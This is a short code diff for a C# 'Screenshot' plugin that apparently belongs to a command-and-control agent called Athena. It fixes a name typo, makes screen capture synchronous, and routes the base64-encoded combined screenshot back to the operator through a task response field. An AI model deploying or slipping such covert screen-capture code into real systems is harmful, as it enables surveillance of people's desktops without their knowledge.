@@ -13,13 +13,13 @@ namespace Plugins
 {
     public class Screenshot : AthenaPlugin
     {
-        public override string Name => "screeenshot";
+        public override string Name => "screenshot";
         public override void Execute(Dictionary<string, string> args)
         {
             try
             {
                 {
-                    var bitmaps = ScreenCapture.CaptureAsync().Result;
+                    var bitmaps = ScreenCapture.Capture();
                     //Determine the size of the combined bitmap
                     int combinedWidth = 0;
                     int maxHeight = 0;
@@ -70,8 +70,9 @@ namespace Plugins
                     TaskResponseHandler.AddResponse(new ResponseResult
                     {
                         completed = true,
-                        user_output = combinedBitmapBase64,
+                        user_output = "Done.",
                         task_id = (string)args["task-id"],
+                        process_response = new Dictionary<string, string> { { "message", combinedBitmapBase64 } },
                     });
 
                 }
@@ -87,7 +88,7 @@ namespace Plugins
 
     class ScreenCapture
     {
-        public static async Task<List<Bitmap>> CaptureAsync()
+        public static List<Bitmap> Capture()
         {
             var bitmaps = new List<Bitmap>();
             foreach (var screen in GetScreens())
